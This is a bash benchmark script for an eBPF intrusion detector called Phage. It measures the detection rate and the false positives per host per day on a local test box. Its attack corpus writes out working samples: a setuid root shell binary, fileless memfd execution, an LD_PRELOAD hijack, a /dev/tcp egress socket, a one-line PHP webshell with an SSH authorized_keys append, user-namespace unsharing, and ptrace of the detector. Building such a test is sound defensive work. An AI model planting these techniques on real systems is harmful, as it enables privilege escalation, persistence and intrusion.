#!/usr/bin/env bash
# phagebench.sh — an honest, reproducible evaluation of Phage.
#
# Measures the two numbers security tools rarely publish together:
#   * detection rate  — of a labeled attack corpus, how many Phage flags, and
#   * false positives — alerts raised while only BENIGN work runs after learning,
#                       expressed as false-positives per host per day.
#
# Methodology: learn a baseline from a benign workload, then (1) run each attack
# once in alert mode and record whether it fired, and (2) run a fresh benign
# workload for a timed window and count every alert (each is a false positive).
# All local to this authorized test box; everything is cleaned up at the end.
set -uo pipefail
cd /root/phage

OBJ=bpf/build/sensors.bpf.o
STATE=/tmp/pb-base.json
LOG=/tmp/pb-alert.log
WEB=/var/www/html
DEMOH=/home/demo
SR="systemd-run --quiet"
FP_WINDOW=60   # seconds of benign activity measured for false positives

pass=0; total=0; declare -a ROWS
APID=""

cleanup(){
  [ -n "$APID" ] && kill -TERM "$APID" 2>/dev/null
  pkill -x phaged 2>/dev/null; pkill -9 -f "rootsh sleep" 2>/dev/null
  for f in $(find /sys/fs/cgroup/phage -name cgroup.freeze 2>/dev/null); do echo 0 >"$f" 2>/dev/null; done
  for u in pb-priv pb-ld pb-egr pb-ns; do systemctl stop "$u.service" 2>/dev/null; systemctl reset-failed "$u.service" 2>/dev/null; done
  rm -rf "$WEB" "$DEMOH" /tmp/pb-* /tmp/rootsh* /tmp/sleeper* /tmp/memfd_poc* /tmp/evil.so /tmp/kexp* /tmp/ptrace_poc* /tmp/seed.php /usr/local/bin/pb-rootsh
}
trap cleanup EXIT

# ---- build attack helpers ---------------------------------------------------
build(){
  cat >/tmp/rootsh.c <<'C'
#include <unistd.h>
int main(int c,char**v){setgid(0);setuid(0);if(c>1)execvp(v[1],v+1);execl("/usr/bin/id","id",0);return 1;}
C
  clang -O2 -o /usr/local/bin/pb-rootsh /tmp/rootsh.c; chown root:root /usr/local/bin/pb-rootsh; chmod 4755 /usr/local/bin/pb-rootsh
  cat >/tmp/sleeper.c <<'C'
#include <unistd.h>
int main(void){sleep(3);return 0;}
C
  clang -O2 -o /tmp/sleeper /tmp/sleeper.c
  cat >/tmp/memfd_poc.c <<'C'
#define _GNU_SOURCE
#include <sys/syscall.h>
#include <fcntl.h>
#include <unistd.h>
int main(void){int fd=syscall(SYS_memfd_create,"nginx",0);int s=open("/tmp/sleeper",O_RDONLY);char b[65536];ssize_t n;while((n=read(s,b,sizeof b))>0)write(fd,b,n);close(s);char*a[]={"nginx",0},*e[]={0};syscall(SYS_execveat,fd,"",a,e,AT_EMPTY_PATH);return 1;}
C
  clang -O2 -o /tmp/memfd_poc /tmp/memfd_poc.c
  cat >/tmp/kexp.c <<'C'
#define _GNU_SOURCE
#include <sched.h>
#include <unistd.h>
int main(void){unshare(CLONE_NEWUSER);sleep(1);return 0;}
C
  clang -O2 -o /tmp/kexp /tmp/kexp.c
  cat >/tmp/ptrace_poc.c <<'C'
#define _GNU_SOURCE
#include <sys/ptrace.h>
#include <unistd.h>
#include <stdlib.h>
int main(int c,char**v){pid_t p=atoi(v[1]);ptrace(PTRACE_ATTACH,p,0,0);sleep(1);ptrace(PTRACE_DETACH,p,0,0);return 0;}
C
  clang -O2 -o /tmp/ptrace_poc /tmp/ptrace_poc.c
  echo 'void f(void){}' | clang -shared -fPIC -x c -o /tmp/evil.so -
  mkdir -p "$WEB/uploads" "$DEMOH/.ssh"; :>"$DEMOH/.ssh/authorized_keys"; echo '<?php ?>' >/tmp/seed.php
}

# benign workload: ordinary admin + web activity (used for learning AND for the
# false-positive window). Deliberately varied so it is a fair FP test.
benign_once(){
  ls -la / >/dev/null; cat /etc/hostname >/dev/null; date >/dev/null; grep -c . /etc/passwd >/dev/null
  ps aux >/dev/null; head -1 /etc/os-release >/dev/null; wc -l /etc/services >/dev/null
  curl -s -o /dev/null --max-time 2 https://1.1.1.1/ || true
  cp /tmp/seed.php "$WEB/app_$RANDOM.php"
  runuser -u nobody -- /usr/local/bin/pb-rootsh id >/dev/null 2>&1 || true   # benign privileged op WITH a session
  unshare -Ur true 2>/dev/null || true   # a host that legitimately uses user namespaces (containers)
}

# detect: a scenario counts as detected only if the SIGNAL-SPECIFIC reason fired
# (not the incidental "a service spawned a novel program" alert every launch
# raises) — a fair, per-signal test. $1 name, $2 marker, $3 reason-regex.
detect(){
  local name="$1" mark="$2" re="$3"
  sleep 2
  local hit
  hit=$(tail -n +"$mark" "$LOG" | grep -E "score=0\.[4-9]|score=1\.00" | grep -iE "$re" | head -1)
  total=$((total+1))
  if [ -n "$hit" ]; then
    pass=$((pass+1))
    local sc; sc=$(echo "$hit" | grep -oE "score=[0-9.]+" | head -1 | cut -d= -f2)
    ROWS+=("$(printf '  %-26s DETECTED   (score %s)' "$name" "$sc")")
  else
    ROWS+=("$(printf '  %-26s MISSED' "$name")")
  fi
}
mark(){ echo $(( $(wc -l <"$LOG") + 1 )); }

echo "=================== PhageBench ==================="
echo "host: $(uname -sr) $(uname -m)"
build

echo "== LEARN baseline (benign workload) =="
rm -f "$STATE"
./bin/phaged -bpf "$OBJ" -mode learn -state "$STATE" >/dev/null 2>&1 & LP=$!
sleep 1; for i in $(seq 1 60); do benign_once; done; sleep 1
kill -TERM "$LP" 2>/dev/null; wait "$LP" 2>/dev/null
echo "   baseline: $(wc -c <"$STATE") bytes"

echo "== start alert-mode agent for evaluation =="
./bin/phaged -bpf "$OBJ" -mode alert -state "$STATE" >"$LOG" 2>&1 & APID=$!
sleep 2
PHAGED_PID=$(pgrep -x phaged | head -1)

echo "== DETECTION corpus (each attack run once) =="
m=$(mark); $SR --unit=pb-priv -p User=nobody bash -c '/usr/local/bin/pb-rootsh sleep 2; true' ; detect "privilege escalation" "$m" "raised to root|no login session"
m=$(mark); /tmp/memfd_poc >/dev/null 2>&1 & sleep 1 ; detect "fileless execution" "$m" "fileless|in-memory"
m=$(mark); $SR --unit=pb-ld -p User=nobody bash -c 'LD_PRELOAD=/tmp/evil.so /usr/bin/id' ; detect "LD_PRELOAD hijack" "$m" "dynamic-linker|LD_PRELOAD"
m=$(mark); $SR --unit=pb-egr -p User=nobody bash -c 'exec 3<>/dev/tcp/1.1.1.1/53' ; detect "reverse-shell egress" "$m" "outbound|egress|:53"
m=$(mark); bash -c 'echo "<?php system(\$_GET[0]);?>" >/var/www/html/uploads/sh.php; echo k >>/home/demo/.ssh/authorized_keys' ; detect "persistence (webshell/key)" "$m" "persistence|authorized_keys|file class|\.php"
m=$(mark); $SR --unit=pb-ns -p User=nobody /tmp/kexp ; detect "kernel-enabling (userns)" "$m" "kernel-enabling|op: userns"
m=$(mark); /tmp/ptrace_poc "$PHAGED_PID" ; detect "self-tamper (ptrace agent)" "$m" "tamper|self.defen"
for u in pb-priv pb-ld pb-egr pb-ns; do systemctl reset-failed "$u.service" 2>/dev/null; done

echo "== FALSE-POSITIVE window (${FP_WINDOW}s of benign-only activity) =="
fpmark=$(mark)
end=$(( $(date +%s) + FP_WINDOW ))
while [ "$(date +%s)" -lt "$end" ]; do benign_once; done
sleep 2
fp=$(tail -n +"$fpmark" "$LOG" | grep -cE "score=0\.[4-9]|score=1\.00")
fp_day=$(awk "BEGIN{printf \"%.1f\", $fp/$FP_WINDOW*86400}")
echo "   false-positive programs (comm):"
tail -n +"$fpmark" "$LOG" | grep -E "score=0\.[4-9]|score=1\.00" | grep -oE 'comm="[^"]*"' | sort | uniq -c | sort -rn | head -10 | sed 's/^/     /' || true

echo
echo "===================== RESULTS ====================="
echo "DETECTION (attack corpus):"
for r in "${ROWS[@]}"; do echo "$r"; done
echo "  ----"
echo "  detection rate: $pass / $total"
echo
echo "FALSE POSITIVES (benign-only, post-learning):"
echo "  alerts in ${FP_WINDOW}s window: $fp"
echo "  => extrapolated false positives/host/day: $fp_day"
echo "==================================================="
